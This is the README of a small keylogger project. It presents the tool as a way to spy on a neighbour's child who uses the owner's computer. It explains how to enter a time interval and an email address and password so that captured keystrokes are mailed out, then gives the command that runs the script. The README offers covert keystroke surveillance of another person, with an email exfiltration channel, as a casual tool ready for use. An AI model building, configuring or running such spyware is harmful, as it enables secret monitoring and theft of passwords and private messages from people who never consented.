# Keylogger
self-made local keylogger

This local keylogger will come in handy while annoying neighbor's child is playing with your computer.
In order to run it locally, you have to make slight changes.

Just edit the run_keylogger.py file as shown below
my_keylogger = keylogger.Keylogger(<enter time interval>, <email address>, <password>)
  ex. my_keylogger = keylogger.Keylogger(120, "my_mail@gmail.com", "123qwe")

Run the program
```
python run_keylogger.py
```
